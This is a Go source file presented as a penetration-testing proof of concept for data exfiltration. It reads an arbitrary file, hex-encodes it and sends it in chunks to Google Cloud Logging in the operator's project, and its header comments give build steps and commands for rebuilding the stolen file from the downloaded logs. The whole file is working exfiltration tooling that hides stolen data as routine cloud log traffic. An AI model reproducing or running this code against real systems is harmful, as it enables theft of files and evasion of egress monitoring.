// Proof of concept enhanced by ChatGPT v4 data exfil binary files to cloud logging via hex string
// Dennis Chow dchow[AT]xtecsystems.com March 26, 2023
// No expressed warranty or liability.
// Dependencies: go init gologexfil/main && go get cloud.google.com/logging
// Usage: go run main.go --service-cred <YOUR-ACC-CRED.json> --project-id <YOUR-GCP-PROJECTID> --exfil-file <PATH/TO/FILE.foo>
// Note: In pen testing do a go build first go build -o gologexfil ./main.go ensure you have already go get cloud.google.com/logging
// Retrieve your file in GCP Cloud Logging either by console and dump to file e.g. cat dump.txt | xxd -r -p > somefile.ext
// Alternatively use jq e.g. jq -r '.[] | {textPayload} | select(.textPayload != null) | .textPayload'  ./downloaded-logs.json > payload-hexdump.text

package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"cloud.google.com/go/logging"
	//"google.golang.org/api/option"
)

const chunkSize = 250000

func readFiletoHex(file_name string) string {
	// *caution test with small files first* this ingests completely in memory at once vs. streaming to a buffer
	file, err := os.Open(file_name)
	if err != nil {
		log.Fatalf("Ensure you have specified a valid filepath %v", err)
	}
	defer file.Close()

	// Read the file contents into a byte slice
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
	}
	fileSize := fileInfo.Size()
	fileData := make([]byte, fileSize)
	_, err = file.Read(fileData)
	if err != nil {
		panic(err)
	}

	// Convert the binary data to hex
	hexData := hex.EncodeToString(fileData)
	return hexData
}

func main() {
	// Capture user arguments at runtime
	service_acc_file := flag.String("service-cred", "", "/path/to/svc_acc_cred.json")
	project_id := flag.String("project-id", "", "your projectid from svc_acc_cred.json")
	exfil_file := flag.String("exfil-file", "", "/path/to/upload.bin")
	flag.Parse()

	// Grab GCP service account from env variables
	os.Setenv("GOOGLE_APPLICATION_CREDENTIALS", *service_acc_file)

	// Setup GCP cloud logging client
	ctx := context.Background()
	//client, err := logging.NewClient(ctx, *project_id, option.WithCredentialsFile(*service_acc_file))
	client, err := logging.NewClient(ctx, *project_id)
	if err != nil {
		log.Fatalf("Failed to create client: %v", err)
	}
	defer func() {
		if err := client.Close(); err != nil {
			log.Fatalf("Failed to close client: %v", err)
		}
	}()

	// Prepare the log name
	fileParts := strings.Split(*exfil_file, "/")
	fileName := fileParts[len(fileParts)-1]
	logName := fmt.Sprintf("%s-chunks-%s", fileName, strconv.FormatInt(time.Now().Unix(), 10))
	logger := client.Logger(logName)

	// Read file contents and divide into chunks
	hexData := readFiletoHex(*exfil_file)
	hexDataLen := len(hexData)
	chunksRemaining := (hexDataLen + chunkSize - 1) / chunkSize

	for i := 0; i < hexDataLen; i += chunkSize {
		chunkEnd := i + chunkSize
		if chunkEnd > hexDataLen {
			chunkEnd = hexDataLen
		}
		chunk := hexData[i:chunkEnd]
		chunkNum := i/chunkSize + 1
		logLabel := map[string]string{"chunk-number": strconv.Itoa(chunkNum)}
		logger.Log(logging.Entry{
			Payload:  chunk,
			Severity: logging.Info,
			Labels:   logLabel,
		})
		chunksRemaining--
		log.Printf("Chunk %d: %d bytes, %d chunks remaining\n", chunkNum, len(chunk)/2, chunksRemaining)
	}
}
